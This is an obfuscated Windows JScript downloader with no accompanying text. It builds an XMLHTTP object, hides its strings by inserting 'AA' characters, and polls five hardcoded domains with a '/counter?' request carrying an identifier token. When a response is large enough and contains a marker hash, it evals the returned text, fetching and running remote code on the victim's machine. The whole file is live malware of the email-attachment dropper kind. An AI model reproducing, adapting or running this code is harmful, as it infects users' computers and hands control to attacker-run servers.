var mud = new ActiveXObject(lllikana("MSXAAML2.XMLHTAATP"+''));
function lllikana(prototu){return prototu.replace(/AA/g,"");}
var zemk = '0000001PyVzMeGPkcnK3RH84qYSkDBJ6ejWAZ7pJ03830800MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4t_Pgw8IW16K8uGZ1NsKIdmpBbYwqVZeYY99ZmHnWBLaLPYSwSFG3cyxcq_zr2tjzVS0eXMSoJhjoWqL7PzYlL_tIW2s6DrKYQrUzJyeFK8tH0XUw0VP3O3_3BLyLcqBmu5pMTMXC3d7A9V0VDIJR2OBM-mpEuBEqSJoUz3RNGVabM-2EFPpN2cmttQI7N-hCyxTajqDq8Iam527OqEUSMX9HhrTktNvgDB4wz-yoSOCiJ3O2lAvCaCDk1pOMOtvBumzuv-p8pwbYmCo1O1gstNoDC8USU_cidKOQCworfRyMzsCkIV4j2Q0ATFMQccfj_RyFm2QBmYW2ePbHTgD8wIDAQABzXP68xAv-j6LZ0_kaYp_-bnYB-5qxE_4-hJuKYwKfNGlooL_p6EM1G_u4-Ll9eMvE2NOm-4S8UiL26JVaEHBPzMt0';
var ruxk = '9fb436e2e4166e0bf9fbe3b914fad9e3';
var x = ["ionios-sa.gr","b2stomatologia.pl","connexion-zen.com","infermierifktmatuziani.org","dilaratahincioglu.com"];
var omuzga = 0;
var griin = 0;
var nester = new Array('RESPAN', 'GET', 'MUSIDO', "GARILLA", "AMBROSIA", "GUEST");
var mustafa = x.length+0;
function malysh() {return lllikana("htAA"+"tAAp");}
function rizma(kjg, lki) {return kjg.split(lki);}
function greezno() {return lllikana('counAAter');}
function hust(gulibator){eval(gulibator);}
function kidok(heruim){return heruim.responseText;}
function zulum(pikue) {pikue.send();}
var ghyt = !true;
while(true)
{
	var gerlk = x[omuzga+0];
	if(omuzga>=mustafa)
	{
		break;
	}
	try
	{				
		mud.open(nester[3-2], malysh()+"://"+gerlk+'/'+greezno()+'?'+zemk, ghyt);
		zulum(mud);
		var gt = mud.responseText;
		var kimmich = gt.length;
		var lepych = 0 + gt.indexOf(ruxk);
		var miluoki = "a";
		if ((kimmich+griin) > (8+1+1) * 100 && lepych > -1) 
		{
			var gusar = rizma(gt, ruxk).join(miluoki);
			hust(gusar);
			break;
		}
	}
	catch(e)
	{
	};
	omuzga++;
};